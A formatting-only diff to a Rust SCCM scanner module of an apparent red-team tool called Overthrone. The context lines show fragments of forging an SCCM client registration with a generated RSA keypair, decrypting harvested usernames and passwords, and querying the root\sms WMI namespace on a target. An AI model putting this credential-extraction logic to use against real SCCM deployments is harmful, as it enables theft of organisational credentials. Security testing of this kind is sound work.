@@ -4,11 +4,7 @@
 //! enumeration, discovery, and exploitation functionalities.
 use crate::error::{OverthroneError, Result};
 use base64::{Engine, engine::general_purpose::STANDARD as b64};
-use rsa::{
-    RsaPrivateKey,
-    pkcs1v15::Pkcs1v15Encrypt,
-    pkcs8::EncodePublicKey,
-};
+use rsa::{RsaPrivateKey, pkcs1v15::Pkcs1v15Encrypt, pkcs8::EncodePublicKey};
 use sha2::{Digest, Sha256};
 use std::time::Duration;
 use tracing::{info, warn};
@@ -61,7 +57,10 @@ impl SccmScanner {
                 protocol: "SCCM".to_string(),
                 reason: format!("HTTP client init: {}", e),
             })?;
-        Ok(Self { config, http_client })
+        Ok(Self {
+            config,
+            http_client,
+        })
     }
 
     /// Primary discovery function combining HTTP and WMI (command generation for WMI)
@@ -131,14 +130,15 @@ impl SccmScanner {
                 reason: format!("Failed to build HTTP client: {}", e),
             })?;
 
-        let response = client
-            .get(&endpoint)
-            .send()
-            .await
-            .map_err(|e| OverthroneError::Protocol {
-                protocol: "SCCM".to_string(),
-                reason: format!("HTTP request failed: {}", e),
-            })?;
+        let response =
+            client
+                .get(&endpoint)
+                .send()
+                .await
+                .map_err(|e| OverthroneError::Protocol {
+                    protocol: "SCCM".to_string(),
+                    reason: format!("HTTP request failed: {}", e),
+                })?;
 
         if !response.status().is_success() {
             return Ok(None);
@@ -216,8 +216,8 @@ impl SccmScanner {
         // 1. Generate RSA Keypair
         info!("Generating 2048-bit RSA keypair for SCCM client registration...");
         let mut rng = rsa::rand_core::OsRng;
-        let priv_key = RsaPrivateKey::new(&mut rng, 2048)
-            .map_err(|e| OverthroneError::Protocol {
+        let priv_key =
+            RsaPrivateKey::new(&mut rng, 2048).map_err(|e| OverthroneError::Protocol {
                 protocol: "SCCM".to_string(),
                 reason: format!("RSA generation failed: {}", e),
             })?;
@@ -240,11 +240,7 @@ impl SccmScanner {
             .to_string()
             .to_uppercase();
 
-        let fqdn = format!(
-            "WIN-{}.{}",
-            &sms_id_guid[0..8],
-            self.config.domain
-        );
+        let fqdn = format!("WIN-{}.{}", &sms_id_guid[0..8], self.config.domain);
         let sms_id = format!("GUID:{}", sms_id_guid);
         let smbios_id = uuid::Uuid::new_v4().to_string().to_uppercase();
 
@@ -359,9 +355,7 @@ impl SccmScanner {
                             let dec_user = priv_key.decrypt(Pkcs1v15Encrypt, &u_bytes);
                             let dec_pass = priv_key.decrypt(Pkcs1v15Encrypt, &p_bytes);
 
-                            if let (Ok(dec_user_bytes), Ok(dec_pass_bytes)) =
-                                (dec_user, dec_pass)
-                            {
+                            if let (Ok(dec_user_bytes), Ok(dec_pass_bytes)) = (dec_user, dec_pass) {
                                 // SCCM encodes these as UTF-16LE
                                 let username = String::from_utf16_lossy(
                                     &dec_user_bytes
@@ -443,19 +437,19 @@ impl SccmScanner {
 
         // WMI is a blocking COM operational path. Must run inside spawn_blocking.
         let result = tokio::task::spawn_blocking(move || -> Result<Vec<SccmSite>> {
-            let com_con = COMLibrary::new()
-                .map_err(|e| OverthroneError::Protocol {
-                    protocol: "SCCM".to_string(),
-                    reason: format!("COM init failed: {}", e),
-                })?;
+            let com_con = COMLibrary::new().map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("COM init failed: {}", e),
+            })?;
 
             // Connect to root\sms
             let namespace = format!(r#"\\{}\root\sms"#, target);
-            let wmi_con = WMIConnection::with_namespace_path(&namespace, com_con)
-                .map_err(|e| OverthroneError::Protocol {
+            let wmi_con = WMIConnection::with_namespace_path(&namespace, com_con).map_err(|e| {
+                OverthroneError::Protocol {
                     protocol: "SCCM".to_string(),
                     reason: format!("WMI connect failed: {}", e),
-                })?;
+                }
+            })?;
 
             #[derive(Deserialize, Debug)]
             #[serde(rename_all = "PascalCase")]
